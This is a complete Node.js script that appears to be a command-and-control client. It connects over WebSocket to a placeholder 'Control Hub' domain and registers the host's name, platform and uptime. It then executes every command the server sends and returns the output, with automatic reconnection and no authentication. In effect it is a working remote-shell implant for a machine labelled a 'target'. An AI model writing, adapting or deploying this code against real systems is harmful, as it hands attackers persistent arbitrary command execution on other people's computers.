const WebSocket = require('ws');
const os = require('os');
const { exec } = require('child_process');

// Replace with your live web domain (wss://) or host IP (ws://)
const SERVER_URL = 'wss://your-domain.com'; 
const DEVICE_ID = os.hostname() || 'target-node';

function connect() {
    console.log(`Connecting to Control Hub at ${SERVER_URL}...`);
    const ws = new WebSocket(SERVER_URL);

    ws.on('open', () => {
        console.log('Connected to hub. Registering device...');
        ws.send(JSON.stringify({
            type: 'register',
            deviceId: DEVICE_ID,
            info: {
                platform: os.platform(),
                arch: os.arch(),
                uptime: os.uptime()
            }
        }));
    });

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'exec') {
                console.log(`Executing: ${msg.command}`);
                exec(msg.command, (err, stdout, stderr) => {
                    ws.send(JSON.stringify({
                        type: 'response',
                        result: err ? stderr || err.message : stdout
                    }));
                });
            }
        } catch (e) {
            console.error('Error processing server message:', e.message);
        }
    });

    ws.on('close', () => {
        console.log('Connection lost. Reconnecting in 5 seconds...');
        setTimeout(connect, 5000);
    });

    ws.on('error', (err) => {
        console.error('WebSocket Error:', err.message);
        ws.close();
    });
}

connect();
